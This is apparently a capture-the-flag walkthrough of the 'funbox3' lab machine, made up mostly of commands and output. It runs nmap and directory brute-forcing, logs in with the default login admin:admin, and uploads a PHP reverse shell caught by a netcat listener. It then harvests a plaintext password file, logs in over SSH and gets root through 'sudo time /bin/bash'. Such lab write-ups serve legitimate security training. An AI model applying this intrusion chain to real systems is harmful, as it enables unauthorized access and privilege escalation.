-> I started by enumerating the machine 
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -Pn -sV 192.168.177.111

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 10:37 EST
Nmap scan report for 192.168.177.111
Host is up (0.14s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.99 seconds
```
-> I noticed it had an web page, so I look for hidden directories
```
┌──(root㉿kali)-[/home/astra]
└─# dirbuster -u http://192.168.177.111/ -l /usr/share/wordlists/wfuzz/general/common.txt 
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /admin/ - 200
Dir found: /secret/ - 200
Dir found: /store/ - 200
File found: /robots.txt - 200
Dir found: /admin/assets/ - 200
Dir found: /admin/assets/plugins/ - 200
File found: /store/admin.php - 200
```
-> I noticed it had an /store/admin.php, it requested an login, so I input admin:admin, and I got in.
-> I go to http://192.168.177.111/store/admin_add.php and try to upload a reverse php shell, first I initiate netcat listening on port 7777.
```
┌──(root㉿kali)-[/home/astra]
└─# nc -lvnp 7777                                    
listening on [any] 7777 ...
```
![Screenshot_3](https://user-images.githubusercontent.com/47869173/220700851-98432f1e-d888-4f75-a197-47a2278cb56e.png)
![Screenshot_4](https://user-images.githubusercontent.com/47869173/220700840-07a332b5-a4a0-4a83-9f75-9dbddb09ee19.png)
![image](https://user-images.githubusercontent.com/47869173/220700845-280277f2-3418-4e48-a798-f49c0219998d.png)

-> After uploading the shell, I find it here http://192.168.177.111/store/bootstrap/img, and I click on the shell, andddd, I'm in!
```
┌──(root㉿kali)-[/home/astra]
└─# nc -lvnp 7777                                    
listening on [any] 7777 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.177.111] 45016
Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:59:29 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$  python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@funbox3:/$ 
```
-> I thought it would have the user flag right away, but I was wrong, moving to home directory I found an interesting password file under tony's user
```
www-data@funbox3:/$ ls
ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
www-data@funbox3:/$ cd home
cd home
www-data@funbox3:/home$ ls
ls
tony
www-data@funbox3:/home$ cd tony
cd tony
www-data@funbox3:/home/tony$ ls
ls
password.txt
www-data@funbox3:/home/tony$ cat password.txt
cat password.txt
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
www-data@funbox3:/home/tony$ 
```
-> After that I login with tony's user and escalate privileges 
```

www-data@funbox3:/home/tony$ ssh -l tony 192.168.177.111

ssh -l tony 192.168.177.111
Could not create directory '/var/www/.ssh'.
The authenticity of host '192.168.177.111 (192.168.177.111)' can't be established.
ECDSA key fingerprint is SHA256:lDqW7tOK4ZCIRla+OSX6KVPDsRFL04w865Q2Q7MR7+k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
tony@192.168.177.111's password: yxcvbnmYYY


tony@funbox3:~$ ls 
ls
password.txt
tony@funbox3:~$ cat pas
cat password.txt 
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
tony@funbox3:~$ sudo -l
sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD:
        /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
tony@funbox3:~$ sudo time /bin/bash
sudo time /bin/bash
root@funbox3:/home/tony# id
id
uid=0(root) gid=0(root) groups=0(root)
root@funbox3:/home/tony# cd
cd
root@funbox3:~# cd root
cd root
bash: cd: root: No such file or directory
root@funbox3:~# ls
ls
proof.txt  root.flag  snap
root@funbox3:~# cat pro
cat proof.txt 
89940c54a5eff574e10d5f1f0cfe3f5a
```
-> And we got the root flag !
